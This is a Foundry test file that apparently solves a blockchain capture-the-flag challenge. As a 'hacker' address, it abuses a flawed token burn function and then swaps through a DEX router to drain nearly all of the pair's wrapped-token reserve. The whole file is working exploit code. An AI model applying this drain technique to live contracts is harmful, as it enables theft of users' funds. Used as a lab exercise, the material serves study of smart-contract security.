// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/chall03/chall03.sol";
import "../src/DexFiles/Library.sol";
import "forge-std/console.sol";



contract ContractTest is Test {

    address hacker = vm.addr(1);
    address wmel = 0x9E6682DfB112c1AA831c97a883B204400C466fCD;
    address _target = 0x5aFfb3F07445adA9B583262218eFF43307290cb5;
    address _factory = 0xCfE11e6D0503574a96e2fb374d14462743EF567f;
    address _router = 0xBb94D324E19c93b4FA57331c433Fd99eEF3101b8;

    hero2301 public target;
    IKwikEFactory public factory;
    IKwikEPair public kpair;
    IKwikERouter02 public router;


    function setUp() public {
        target = hero2301(_target);
        factory = IKwikEFactory(_factory);
        router = IKwikERouter02(_router);
        
    }

    function testExploit() public {
        vm.createSelectFork(vm.rpcUrl("CTFblockchain"));
        vm.startPrank(hacker);

        kpair = IKwikEPair(factory.getPair(address(target),wmel));

        address[] memory t = new address[](2);
        t[0] = address(target);
        t[1] = wmel;

        uint valueOut = 20 ether - 0.4 ether;//19550000000000000000;

        uint[] memory amountsIn = router.getAmountsIn(valueOut,t);
        uint hackamount = amountsIn[0];

        target.burn(hackamount);

        console.log("hacker balance : ",target.getBalanceOf(hacker));

        target.approve(address(router),type(uint256).max);

        router.swapExactTokensForTokens(hackamount,0,t,hacker,block.timestamp+2 days);


        kpair = IKwikEPair(factory.getPair(address(target),wmel));
        (uint112 amount00, uint112 amount01,) = kpair.getReserves();
        console.log("Amount0 in reserve : ",amount00,"addr 0 : ",kpair.token0()); //erc20 vulnerable
        console.log("Amount1 in reserve : ",amount01,"addr 1 : ",kpair.token1());

        assertLt(amount00,0.5 ether);
    }
}
